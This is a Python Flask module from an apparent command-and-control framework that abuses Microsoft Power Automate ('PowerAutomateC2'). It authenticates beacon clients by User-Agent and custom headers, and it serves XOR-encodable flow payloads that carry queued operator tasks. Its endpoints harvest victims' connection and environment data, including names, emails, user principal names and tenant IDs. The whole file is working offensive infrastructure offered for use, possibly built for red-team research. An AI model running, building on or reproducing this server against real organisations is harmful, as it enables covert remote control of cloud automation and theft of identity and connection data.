from flask import Blueprint, request, g, abort, jsonify, Response
from flask import current_app as app
import json
import os

# pac2 modules
from app.flow.beacon import HTTPBeacon
from app.flow.payloads import *
from app.services import client_service, user_service, flowmanagement_service, connection_service, environment_service
from app.services import task_service
from app.utils import log_after_request, setup_logger


http_reciever = Blueprint("http_reciever", __name__, template_folder="templates")

# Setup logging modules
log_path = os.path.abspath(os.path.join(__file__, "..", "..", "log", "c2_access.log"))
setup_logger("c2_access", log_path,)


@http_reciever.before_request
def preprocess():
    """
    HTTPBot用の関連のリクエストの前処理
    """
    if "azure-logic-apps/1.0" not in request.headers.get("User-Agent"):
        return abort(401)

    # HTTPヘッダ Pa-Client-Id, Pa-Task-Id
    g.client_id = request.headers.get("Pa-Client-Id", None)
    task_id = request.headers.get("Pa-Task-Id", None)
    # HTTPヘッダがない場合はabort
    if not g.client_id:
        return abort(401)

    # DBにセッション情報があるか確認する
    g.client = client_service.get_client_by_id(g.client_id)
    if not g.client:
        # 登録がないクライアントIDの通信はAbortする
        return abort(401)
    else:
        # セッションの最終更新を更新する
        g.client = client_service.update_client(g.client.client_id)
    g.client_id = g.client.client_id

    # taskのステータスを更新する
    if task_id:
        task_service.task_finished(task_id)


@http_reciever.route("/payload", methods=["GET"])
def payload():
    """
    PowerAutomateC2のペイロードを設置するパス
    """

    # 1. clientのデータ取得
    is_init = request.args.get("init", False)
    method = g.client.method
    flowmanagement_id = g.client.flowmanagement_id
    c2_url = g.client.c2_connection
    is_encoded = g.client.is_encoded
    xor_key = g.client.xor_key

    # get application config
    sleep_time = app.config.get("SLEEP_TIME", 60)
    jitter = app.config.get("JITTER", 10)
    has_approval = app.config.get("SET_APPROVE_ACTION", True)

    # emailを取る
    email = None
    client = client_service.get_client_by_id(g.client_id)
    user = client.get_user()
    if user:
        email = user.email

    # init payload does not have enough connector info to set Approval Actions.
    if is_init:
        has_approval = False

    # 2. もととなるペイロードの生成
    beacon = HTTPBeacon(flowmanagement_id, g.client_id, c2_url, is_encoded, xor_key, is_init=False, sleep_time=sleep_time, jitter=jitter, has_approval=has_approval, email=email)

    # 3. 収集したConnection情報を元にbeaconのConnectionsを更新
    user = flowmanagement_service.get_user_for_flowmanagement(flowmanagement_id)
    if user:
        user_id = user.user_id
        connections = connection_service.get_connection_by_id(user_id)
        connections_data = json.loads(connections.data)
        beacon.set_connections_data(connections_data)
        beacon.update_connections()

    flow = beacon.generate_flow()

    # 4. DBのタスクに応じて、応答するflowにタスクを追加する。
    if not is_init:
        tasks = task_service.get_tasks_by_client_id_and_state(g.client_id, state="submitted")
        for task in tasks:
            payload = None
            # cls = globals().get(task.task_type+"Payload", None)
            if task.task_type == "Raw":
                actions = RawActions(json.loads(task.task_raw))
                flow.add_top_action(ScopeStatement(task.task_id,actions))
                task_service.task_processing(task.task_id,"processed")
            else:
                cls = PAYLOAD_MODULES.get(task.task_type+"Payload")
                args = json.loads(task.task_args)
                if cls:
                    payload = cls(**args, mode=method, task_id=task.task_id)
                    flow.add_top_action(payload.generate_payload())
                    task_service.task_processing(task.task_id)

    # Convert DeleteFlowAction to wait all until all task finish (similer to "await")
    # Find the edge nodes and termination node which is DeleteFlowAction
    action_name_set = set(flow.root_actions.nodes.keys()) # nodes connect to delete flow action. 
    delete_action = None # termination node

    if "root" in action_name_set:
        action_name_set.remove("root")

    for name, action in flow.root_actions.nodes.items():
        if action.runafter:
            for name in action.runafter.keys():
                if name in action_name_set:
                    action_name_set.remove(name)

    for name in list(action_name_set):
        if isinstance(flow.root_actions.nodes[name],DeleteFlowAction):
            delete_action = name
            action_name_set.remove(delete_action)

    # update delete flow action
    if delete_action:
        for name in list(action_name_set):
            flow.root_actions.nodes[delete_action].runafter[name] = ['Succeeded', 'Failed', 'Skipped', 'TimedOut']

    # 5. Payloadを応答
    if is_encoded:
        return Response(flow.export_json(xor_key), 200)

    # print(json.dumps(flow.export(),indent=2))
    return jsonify(flow.export()), 200


@http_reciever.route("/connections", methods=["POST"])
def connections():
    """
    PowerAutomateの接続情報を受け取るためのパス
    """
    result = {
        "result": "Failed",
    }
    # 0. Get Client Information
    flowmanagement_id = g.client.flowmanagement_id

    # 1. データを取得
    data = ""
    try:
        json_data = request.get_json()
        data = json.dumps(json_data)
    except Exception:
        return jsonify(result), 406

    # 2. Parse User data
    if "value" not in json_data.keys():
        return jsonify(result), 406
    for d in json_data["value"]:
        if flowmanagement_id in d["name"]:
            username = d["properties"]["createdBy"]["displayName"]
            email = d["properties"]["createdBy"]["email"]
            user_principal_name = d["properties"]["createdBy"]["userPrincipalName"]
            user_uuid = d["properties"]["createdBy"]["id"]
            tenant_id = d["properties"]["createdBy"]["tenantId"]

    # 3. Userのエントリー有無を参照
    user = user_service.get_user_by_id(user_uuid)
    if not user:
        user = user_service.create_user(user_uuid, username, user_principal_name, tenant_id, email)

    # 4. UserとFlowManagentのリレーション更新
    flowmanagement = flowmanagement_service.get_flowmanagement_by_id(flowmanagement_id)
    if not flowmanagement:
        flowmanagement = flowmanagement_service.create_flowmanagement(flowmanagement_id)
    else:
        flowmanagement_service.update_flowmanagement(flowmanagement_id, user_uuid)

    # 5. Connectionsの更新
    connection = connection_service.get_connection_by_id(user_uuid)
    if not connection:
        connection = connection_service.create_connection(user_uuid, data)
    else:
        connection_service.update_connection(user_uuid, data)

    result["result"] = "Successfuly update connection data."
    result["user_id"] = connection.user_id
    result["username"] = username

    return jsonify(result), 200


@http_reciever.route("/environments", methods=["POST"])
def environments():
    """
    PowerAutomateの環境情報を受け取るためのパス
    """
    result = {
        "result": "Failed",
    }
    # 0. Get Client Information
    flowmanagement_id = g.client.flowmanagement_id
    user = g.client.get_user()
    if not user:
        return jsonify(result), 406

    # get jsondata
    data = ""
    try:
        json_data = request.get_json()
        data = json.dumps(json_data)
    except Exception:
        return jsonify(result), 406

    # update environment
    environment = environment_service.get_environment_by_id(user.user_id)
    if not environment:
        environment = environment_service.create_environment(user.user_id, data)
    else:
        environment = environment_service.update_environment(user.user_id, data)

    result = {
        "result": "Successfuly update environment data",
        "user_id": user.user_id
    }

    return jsonify(result), 200


@http_reciever.after_request
def postprocess(response):
    """
    リクエストの後処理（ログ）
    """
    return log_after_request(response, "c2_access")
